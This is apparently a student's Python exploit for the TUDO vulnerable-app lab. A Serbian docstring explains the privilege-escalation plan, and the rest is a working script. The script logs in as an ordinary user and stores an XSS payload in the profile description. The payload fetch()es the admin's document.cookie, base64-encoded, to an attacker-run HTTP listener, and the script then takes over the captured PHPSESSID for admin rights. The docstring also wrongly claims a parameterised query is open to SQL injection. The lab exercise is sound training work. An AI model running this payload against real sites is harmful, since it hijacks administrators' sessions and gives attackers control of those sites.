"""
TUDO eskalacija prava
Ilija Jordanovski SV 73/2022

Pretpostavke:
    - imamo korisnicki nalog sa kojeg mozemo da se ulogujemo

Statickom analizom koda uocavamo da u `profile.php` fajlu postoje sledeci redovi

```php
$ret = pg_prepare($db, "updatedescription_query", "update users set description = $1 where username = $2");
$ret = pg_execute($db, "updatedescription_query", Array($description, $_SESSION['username']));
```

Upiti u bazu se ne ciste od HTML tagova pre izvrsavanja i moguce je injektovati SQL. Obican korisnik ima pristup ovoj stranici i moze da unese sta god za opis svog profila.

U `login.php` uocavamo da se pri logovanju poziva `session_start()`, koji pri uspesnom logovanju pretrazivacu salje cookie `PHPSESSID`. Ako je korisnik administrator, za cookie se veze flag `$_SESSION['isadmin'] = true` i cuva se na serverskoj strani. Ukoliko mozemo da ukrademo administratorski cookie, imacemo pristup eskaliranim pravima.

Po definiciji projekta znamo da je administratorsko korisnicko ime `admin` i da se admin loguje na svakih minut. Svaki put kada administrator udje na `index.php` stranicu, okine se sledeci upit prema bazi: `$ret = pg_query($db, "select * from users order by uid asc;");`. Ovo znaci da ce administratorski browser pokusati da renderuje sta god se nalazi u kolonama svakog korisnika, ukljucujuci i opis naseg profila.

Na osnovu svega ovoga, mozemo da promenimo opis korisnickog profila u JS koji ce da ukrade administratorsku sesiju kada se administrator uloguje. Ali, kako da nateramo administratora da posalje cookie na destinaciju kojom mi upravljamo?

Najjednostavniji nacin je podici HTTP server sa kojeg cemo moci da citamo sav saobracaj, i u istom trenutku kada citamo administratorski cookie ga i saljemo. Ukradeni cookie lepimo na svoju sesiju i redovan korisnik ima administratorska prava.
"""

import requests
import base64
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

USERNAME="user1"
PASSWORD="pwned123"

TARGET="http://localhost:8000"
LHOST="192.168.65.254"  # Docker Desktop Windows: host.docker.internal
LPORT=8001

stolen_cookie = None

class CookieListener(BaseHTTPRequestHandler):
    def do_GET(self):
        global stolen_cookie
        # path is "/<base64>" — split on first '/' to preserve any '/' inside base64
        encoded = self.path.split('/', 1)[-1]
        print(f"[+] Zahtev primljen: {self.path[:80]}")
        try:
            # btoa() always pads to len%4==0; formula adds 0,1,2 '=' as needed if stripped
            stolen_cookie = base64.b64decode(encoded + '=' * (-len(encoded) % 4)).decode()
        except Exception as e:
            print(f"[-] base64 greska: {e} (path: {self.path})")
            stolen_cookie = ""
        self.send_response(200)
        self.end_headers()
        threading.Thread(target=self.server.shutdown).start()

    def log_message(self, format, *args):
        pass  # BaseHTTPRequestHandler piše u stderr — gasi da ne zatrpa output

def steal_cookie():
    global stolen_cookie
    stolen_cookie = None

    payload = f'<img src=x onerror=\'fetch("http://{LHOST}:{LPORT}/"+btoa(document.cookie))\'>'

    session = requests.Session()
    session.post(f"{TARGET}/login.php", data={"username": USERNAME, "password": PASSWORD})

    session.post(f"{TARGET}/profile.php", data={"description": payload})
    print(f"[*] XSS payload upisan. Listener na {LHOST}:{LPORT}")
    print(f"[*] Cekamo admin bota (cron */1 * * * *)... timeout 130s")

    server = HTTPServer(('0.0.0.0', LPORT), CookieListener)
    listener = threading.Thread(target=server.serve_forever)
    listener.start()

    listener.join(timeout=130)

    if listener.is_alive():
        server.shutdown()

    if not stolen_cookie:
        print("no cookie arrived")
        exit(1)

    cookie_dict = dict(p.strip().split('=', 1) for p in stolen_cookie.split(';') if '=' in p)
    phpsessid = cookie_dict.get('PHPSESSID')

    admin_session = requests.Session()
    admin_session.cookies.set('PHPSESSID', phpsessid)

    print(f'cookie: {stolen_cookie}')
    return phpsessid

if __name__ == "__main__":
    steal_cookie()
